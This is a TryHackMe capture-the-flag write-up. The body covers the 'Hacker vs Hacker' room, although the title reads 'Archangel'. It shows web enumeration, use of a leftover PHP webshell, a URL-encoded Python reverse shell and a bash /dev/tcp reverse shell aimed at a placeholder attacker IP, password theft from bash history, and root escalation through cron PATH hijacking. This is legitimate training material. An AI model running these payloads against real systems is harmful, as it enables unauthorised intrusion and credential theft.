---
title: "TryHackMe: Archangel"
author: cilgin
date: 2025-06-18 00:38:49 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.webp
---

Ahoy! This is my write-up for the [Hacker vs Hacker](https://tryhackme.com/room/hackervshacker) room on TryHackMe. Follow along as I walk you through the steps I took to solve the challenges and capture those sweet, sweet flags.

# Enumeration

## Nmap Scan

First things first, let's make life easier by exporting the target machine's IP address as an environment variable:

```bash
export IP=10.10.42.44
```

And now, let's run an `nmap` scan on our target to see what we're working with:

```bash
nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-18 12:43 +0300
Nmap scan report for 10.10.42.44
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.66 seconds
```

The scan reveals two open ports:

- **22** `ssh`
- **80** `http`

## Directory Fuzzing

With the open ports identified, it's time for some digital digging. Let's unleash `gobuster` and see what treasures we can unearth on the web server.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
<-- snip -->
/css                  (Status: 301) [Size: 308] [--> http://10.10.42.44/css/]
/cvs                  (Status: 301) [Size: 308] [--> http://10.10.42.44/cvs/]
/dist                 (Status: 301) [Size: 309] [--> http://10.10.42.44/dist/]
/images               (Status: 301) [Size: 311] [--> http://10.10.42.44/images/]
/index.html           (Status: 200) [Size: 3413]
/server-status        (Status: 403) [Size: 276]
/upload.php           (Status: 200) [Size: 552]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

And we have a winner! The `/upload.php` file looks mighty interesting. Let's investigate.

## Enumerating the Web Server

A quick `curl` of the `/upload.php` file reveals some juicy source code left in an HTML comment.

```bash
❯ curl http://$IP/upload.php
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```

The webpage also has a handy upload section.

![Desktop View](/assets/img/2025-06-18-TryHackMe-Hacker_vs_Hacker/photo1.webp){: width="1044" height="409" }

The PHP code shows a very weak filter: it only checks if the string `.pdf` exists in the filename. It doesn't check the actual file type or prevent other extensions.

Naturally, I tried to upload the classic pentestmonkey PHP reverse shell. I tried every extension I could think of: `.php`, `.pdf`, `.pdf.php`, and even `.php.pdf`. But alas, the server wasn't buying it. It seems the filter is a bit smarter than it lets on.

Time for round two with `gobuster`! Knowing that uploaded files go to the `/cvs/` directory and that there's some funny business with `.pdf` files, I decided to fuzz that specific directory for files with a `.pdf.php` extension.

```bash
❯ gobuster dir -w common.txt -u http://$IP/cvs/ -x pdf.php -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/cvs/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
<-- snip -->
/index.html           (Status: 200) [Size: 26]
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 9478 / 9478 (100.00%)
===============================================================
Finished
===============================================================
```

And what do you know! It seems the other hacker already left a backdoor for us: `/shell.pdf.php`. How thoughtful! Let's see if we can get some basic command execution going.

```bash
❯ curl http://$IP/cvs/shell.pdf.php?cmd=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
boom!%
```

Boom! We have Remote Code Execution (RCE). Now we're cooking with gas!

## Gaining a Reverse Shell

Let's try to get a proper shell. On my machine, I'll start a netcat listener.

```bash
nc -lvnp 4444
```

Then, using my browser, I'll hit the webshell with a URL-encoded Python reverse shell payload. You can generate your own at awesome sites like [revshells.com](https://www.revshells.com).

`http://10.10.42.44/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22YOUR_IP%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27`

```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.42.44 53822
$ ls
ls
index.html  shell.pdf.php
$ nope
```

Whoops, it looks like the other hacker is actively trying to kick us out of our hard-earned shell. How rude! Since an interactive shell is a no-go, I'll just stick to using `curl` to send commands from the safety of my own terminal.

## Enumerating the Filesystem

Let's see what users are on this machine.

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home"
<pre>total 12
drwxr-xr-x  3 root    root    4096 May  5  2022 .
drwxr-xr-x 19 root    root    4096 May  5  2022 ..
drwxr-xr-x  4 lachlan lachlan 4096 May  5  2022 lachlan
</pre>
```

Let's poke around in `lachlan`'s home directory.

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan"
<pre>total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
</pre>
```

The `.bash_history` file always contains interesting tidbits. Let's take a look.

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
<pre>./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
</pre>
```

Jackpot! Peeking into the bash history reveals a new password being set: `thisistheway123`. It looks like we've got the credentials for the user **lachlan**.

## Connecting to the Machine via SSH

Let's try to log in as `lachlan`.

```bash
❯ ssh lachlan@$IP
lachlan@10.10.42.44's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
<-- snip -->
Last login: Wed Jun 18 10:41:40 2025 from 10.21.206.128
$ nope
Connection to 10.10.42.44 closed.
```

Aaaand we're kicked out. Again. It seems the default login shell is trapped. But what if we don't _use_ the default shell? Let's try specifying `/bin/bash` directly in our SSH command.

```bash
ssh lachlan@$IP /bin/bash
```

Success! That little trick got us a stable shell. We're in! Let's grab the user flag.

```bash
$ ls -la
total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
$ cat user.txt
thm{*****************************}
```

## Privilege Escalation

While snooping around `lachlan`'s home directory, a `bin` folder caught my eye. This is interesting because user-level `bin` directories are often included in the `PATH`. Let's see what's inside and check the system's cron jobs.

```bash
$ cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
<-- snip -->
```

This is our moment to shine! The root user is running a cron job every minute that calls `pkill` to kick out interactive shells (that explains our earlier problem!). Crucially, the `PATH` for this cron job includes `/home/lachlan/bin` _before_ `/bin` or `/usr/bin`. This means if we create our own executable file named `pkill` in `lachlan`'s `bin` directory, the cron job will run _our_ script as root instead of the real `pkill`.

Time to craft our malicious `pkill` script. A simple one-liner that launches a reverse shell should do the trick.

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" > pkill;chmod +x pkill
```

I'll set up another `nc` listener on my machine, cross my fingers, and wait for the cron job to trigger. A minute later...

```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.42.44 53902
bash: cannot set terminal process group (28694): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# whoami
root
root@b2r:~# ls
root.txt
snap
root@b2r:~# cat root.txt
thm{**********************************}
```

And we have a root shell! Game over. Thanks for reading
